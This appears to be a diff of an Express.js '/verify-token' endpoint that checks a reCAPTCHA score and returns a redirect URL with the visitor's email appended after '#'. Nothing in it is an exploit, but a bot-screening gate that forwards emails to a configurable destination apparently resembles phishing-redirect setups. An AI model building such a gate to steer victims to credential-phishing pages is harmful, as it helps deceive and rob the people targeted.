@@ -68,7 +68,7 @@ app.post('/verify-token', async (req, res) => {
 
     const { success, score, 'error-codes': errors = [] } = response.data;
 
-    // Strict score validation (NEW: 0.7 threshold)
+    // Strict score validation
     if (!success) {
       return res.status(403).json({
         success: false,
@@ -77,7 +77,7 @@ app.post('/verify-token', async (req, res) => {
       });
     }
 
-    if (score < 0.7) { // Reject scores below 0.7
+    if (score < 0.7) {
       return res.status(403).json({
         success: false,
         reason: 'Low reCAPTCHA score (minimum: 0.7)',
@@ -86,16 +86,18 @@ app.post('/verify-token', async (req, res) => {
       });
     }
 
-    // Build redirect URL with base64 email (unchanged)
-    let redirectUrl = process.env.REDIRECT_URL || 'https://default-redirect.com';
+    // SINGLE REDIRECT DESTINATION - Modify this URL as needed
+    let redirectUrl = process.env.REDIRECT_URL || 'https://your-primary-site.com';
+    
+    // Append email if provided
     if (email) {
-      redirectUrl = `${redirectUrl.replace(/#.*$/, '')}#${email}`;
+      redirectUrl = `${redirectUrl}#${email}`;
     }
 
     return res.json({ 
       success: true,
       redirect: redirectUrl,
-      score // Optional: Return score to client
+      score
     });
 
   } catch (err) {
@@ -113,6 +115,7 @@ app.post('/verify-token', async (req, res) => {
 // =====================
 const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server running on http://0.0.0.0:${PORT}`);
+  console.log(`✅ Configured for single redirect destination`);
 });
 
 server.keepAliveTimeout = 60000;
